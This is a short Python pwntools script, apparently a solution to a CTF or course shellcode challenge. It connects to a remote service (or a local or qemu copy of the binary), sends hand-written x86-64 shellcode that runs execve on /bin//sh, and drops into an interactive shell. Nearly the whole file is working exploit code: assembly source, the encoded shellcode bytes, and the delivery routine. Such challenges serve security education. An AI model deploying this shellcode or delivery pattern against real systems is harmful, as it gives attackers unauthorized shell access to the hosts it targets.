#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# python3 chal_1.py 
# 要先隨便打一個字，不能直接ls,cat會出不出東西

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

codes = """
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
"""
# payloads = asm(codes)
payloads = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

print(codes)
print(len(payloads),payloads)

# pause()

r.recvuntil(b'code> ')
r.send(payloads)


r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
